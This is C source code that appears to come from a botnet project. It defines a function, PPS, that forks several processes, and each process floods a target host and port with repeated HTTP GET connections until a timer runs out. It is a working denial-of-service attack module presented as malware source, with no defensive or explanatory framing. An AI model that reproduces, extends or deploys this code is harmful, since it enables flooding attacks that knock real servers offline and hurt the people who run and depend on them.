#include "../../includes/px_botnet.h"

extern const char *useragents[];

void PPS(char *host, in_port_t port, int timeEnd, int power)
{
	int error = 0, socket, i, end = time(NULL) + timeEnd, sendIP = 0;
	char request[32], buffer[1];

	for (i = 0; i < power; i++)
	{
		if (fork())
		{
			sprintf(request, "GET / HTTP/1.1\r\n\r\n");
			while (end > time(NULL))
			{
				socket = socket_connect(host, port);
				if (socket != 0)
				{
					i = 0;
					while (i++ < power * 2 && error != -1)
						error = write(socket, request, strlen(request));
					read(socket, buffer, 1);
					close(socket);
				}
			}
			exit(0);
		}
	}
}
